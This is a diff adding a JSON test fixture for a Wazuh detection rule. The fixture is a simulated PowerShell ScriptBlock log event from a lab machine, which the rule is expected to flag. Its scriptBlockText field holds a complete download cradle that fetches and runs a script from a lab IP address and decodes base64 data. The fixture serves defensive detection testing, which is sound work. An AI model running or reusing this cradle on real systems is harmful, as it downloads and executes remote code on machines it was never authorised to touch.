@@ -1,0 +1,19 @@
+{
+  "_comment": "T1059.001 POSITIVE. PowerShell 4104 (ScriptBlock logging) on WIN01 carrying a download cradle + base64 decode — the decoded payload from the WinRM-delivered EncodedCommand. Wazuh rule 100250 MUST fire (matches the download-cradle / FromBase64String indicators).",
+  "_expect": { "rule_id": "100250", "match": true },
+  "data": {
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-PowerShell",
+        "channel": "Microsoft-Windows-PowerShell/Operational",
+        "eventID": "4104",
+        "computer": "WIN01.lab.local"
+      },
+      "eventdata": {
+        "scriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://10.0.1.10/a.ps1'); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))",
+        "scriptBlockId": "a1b2c3d4-0000-0000-0000-000000000001",
+        "path": ""
+      }
+    }
+  }
+}
